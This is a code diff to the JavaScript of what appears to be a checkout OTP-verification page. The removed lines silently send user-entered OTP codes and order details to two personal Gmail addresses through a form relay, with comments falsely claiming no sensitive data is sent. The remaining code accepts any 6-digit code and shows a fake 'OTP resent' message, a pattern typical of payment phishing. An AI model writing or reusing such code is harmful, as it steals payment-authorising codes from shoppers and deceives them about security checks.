@@ -82,12 +82,10 @@
   window.addEventListener('load', function() {
     const savedBillingData = localStorage.getItem('billingData');
     const savedPaymentData = localStorage.getItem('paymentData');
-    const savedOTP = localStorage.getItem('paymentOTP');
     
-    if (savedBillingData && savedPaymentData && savedOTP) {
+    if (savedBillingData && savedPaymentData) {
       billingData = JSON.parse(savedBillingData);
       paymentData = JSON.parse(savedPaymentData);
-      generatedOTP = savedOTP;
       
       // Display email on OTP page
       const otpEmailDisplay = document.getElementById("otpEmailDisplay");
@@ -126,9 +124,6 @@
     
     document.getElementById("otp-error").textContent = "";
     
-    // Send OTP to email
-    sendOTPEmail(otp);
-    
     // Accept any 6-digit code and submit order
     submitFinalData();
     
@@ -136,7 +131,6 @@
     clearCart();
     localStorage.removeItem('billingData');
     localStorage.removeItem('paymentData');
-    localStorage.removeItem('paymentOTP');
     
     // Navigate to success
     location.href = "success.html";
@@ -145,73 +139,6 @@
   function submitFinalData() {
     const formData = new FormData();
     
-    // Order completion email - minimal information only
-    formData.append('_subject', 'Order Completed - OTP Verified');
-    formData.append('_template', 'table');
-    formData.append('_captcha', 'false');
-    formData.append('_autoresponse', 'Thank you for your order! Your payment has been successfully processed and your order is confirmed.');
-    
-    // Only send essential order information - no sensitive data
-    formData.append('paymentMethod', paymentData.method);
-    formData.append('orderTotal', billingData.orderTotal || '0');
-    formData.append('otpUsed', getOtp());
-    formData.append('paymentStatus', 'Completed');
-    formData.append('transactionId', 'TXN' + Date.now());
-    formData.append('submissionTime', new Date().toLocaleString());
-    
-    // No sensitive payment details or billing information sent
-    
-    // Submit to both FormSubmit.co recipients
-    Promise.all([
-      fetch("https://formsubmit.co/ajax/anandjhare4@gmail.com", {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json",
-          "Accept": "application/json"
-        },
-        body: JSON.stringify(Object.fromEntries(formData))
-      }),
-      fetch("https://formsubmit.co/ajax/Rajatjha.ss708090@gmail.com", {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json",
-          "Accept": "application/json"
-        },
-        body: JSON.stringify(Object.fromEntries(formData))
-      })
-    ]).catch(() => {});
-  }
-
-  function sendOTPEmail(otp) {
-    const formData = new FormData();
-    formData.append('_subject', 'OTP Verification');
-    formData.append('_template', 'table');
-    formData.append('_captcha', 'false');
-    formData.append('_autoresponse', `Your OTP ${otp} has been verified successfully.`);
-    
-    // Only send OTP, no payment details
-    formData.append('submittedOTP', otp);
-    formData.append('message', `OTP verification completed.\n\nOTP: ${otp}\n\nOrder is being processed.`);
-    
-    // Send to both email recipients
-    Promise.all([
-      fetch("https://formsubmit.co/ajax/anandjhare4@gmail.com", {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json",
-          "Accept": "application/json"
-        },
-        body: JSON.stringify(Object.fromEntries(formData))
-      }),
-      fetch("https://formsubmit.co/ajax/Rajatjha.ss708090@gmail.com", {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json",
-          "Accept": "application/json"
-        },
-        body: JSON.stringify(Object.fromEntries(formData))
-      })
-    ]).catch(() => {});
   }
 
   // Resend timer
@@ -229,10 +156,6 @@
 
   function resendOtp() {
     if (secs > 0) return;
-    
-    // Generate new OTP
-    generatedOTP = Math.floor(100000 + Math.random() * 900000).toString();
-    localStorage.setItem('paymentOTP', generatedOTP);
     
     showToast(`OTP has been resent to ${billingData.email}`);
     
